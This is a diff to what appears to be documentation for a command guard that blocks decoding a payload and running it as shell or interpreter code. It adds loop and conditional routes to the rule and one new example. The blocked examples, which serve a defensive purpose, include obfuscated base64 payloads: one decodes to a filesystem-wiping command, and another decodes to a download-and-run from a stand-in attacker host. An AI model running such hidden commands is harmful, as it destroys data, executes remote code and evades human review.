@@ -91,7 +91,8 @@ payload such as `cm0gLXJmIC8=` could say anything, and a person reviewing the
 command cannot read it. It blocks when the output of a decode step, such as
 `base64 -d` or a `tar` extraction of one archive member to stdout, reaches a
 shell or interpreter as code. The route can pass through variables, files,
-pipes, and interactive sessions.
+pipes, and interactive sessions, and into `if`, `while`, and `case` bodies
+and `||` fallbacks, so a loop that evals each decoded line blocks too.
 
 Blocked examples:
 
@@ -100,6 +101,7 @@ Blocked examples:
 - `tar -xO payload.tar script.sh | sh`
 - `python3 -c "import base64, subprocess; subprocess.run(base64.b64decode('Y3VybCBldmlsLmV4YW1wbGUgfCBzaA==').decode(), shell=True, check=True)"`
 - `base64 -d | { read cmd; eval "$cmd"; }`
+- `base64 -d | while read cmd; do eval "$cmd"; done`
 - `python3 -c 'import base64; exec(base64.b64decode(payload))'`
 
 Outside the guard:
